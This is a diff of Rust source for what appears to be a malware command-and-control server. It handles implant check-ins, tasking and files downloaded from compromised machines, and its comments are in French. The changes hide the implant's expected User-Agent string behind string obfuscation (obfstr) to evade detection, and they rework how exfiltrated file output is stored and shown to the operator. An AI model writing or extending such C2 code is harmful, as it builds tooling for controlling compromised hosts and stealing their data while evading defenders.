@@ -9,9 +9,6 @@ use uuid::Uuid;
 use crate::links::{Links, NewLink};
 use obfstr::obfstr;
 
-/// User-Agent that all implants must present.
-const IMPLANT_UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
-
 pub struct AppState {
     pub links: Arc<Mutex<Links>>,
 }
@@ -126,10 +123,16 @@ struct TaskResponse {
 // ── Header guards ───────────────────────────────────────────────────────────
 
 fn ua_ok(req: &HttpRequest) -> bool {
-    req.headers()
+    let expected_str =
+        obfstr!("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko").to_string();
+    let ua = req
+        .headers()
         .get("User-Agent")
-        .and_then(|v| v.to_str().ok())
-        .is_some_and(|ua| ua == IMPLANT_UA)
+        .and_then(|v| v.to_str().ok());
+    match ua {
+        Some(ua) => ua == expected_str,
+        None => false,
+    }
 }
 
 fn cookie_ok(req: &HttpRequest) -> bool {
@@ -392,7 +395,24 @@ pub async fn stage3_handler(
                     ui_message = Some((link_name, cli_cmd, decrypted_q.clone()));
                 }
 
-                links.complete_task(link_id, task_id, decrypted_q.clone());
+                // Pour les downloads, préserver le message user-friendly
+                // plutôt que le blob brut FILE:path:base64
+                let complete_output = if is_download {
+                    ui_message
+                        .as_ref()
+                        .map(|(_, _, msg)| msg.clone())
+                        .unwrap_or_else(|| decrypted_q.clone())
+                } else {
+                    decrypted_q.clone()
+                };
+                links.complete_task(link_id, task_id, complete_output);
+                // Marquer affichée : routes.rs l'imprime en temps réel,
+                // ce qui évite le double affichage dans show_completed_task_results() (cli.rs).
+                if let Some(link) = links.get_link_mut(link_id) {
+                    if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
+                        task.displayed = true;
+                    }
+                }
             } else {
                 ui_message = None;
             }
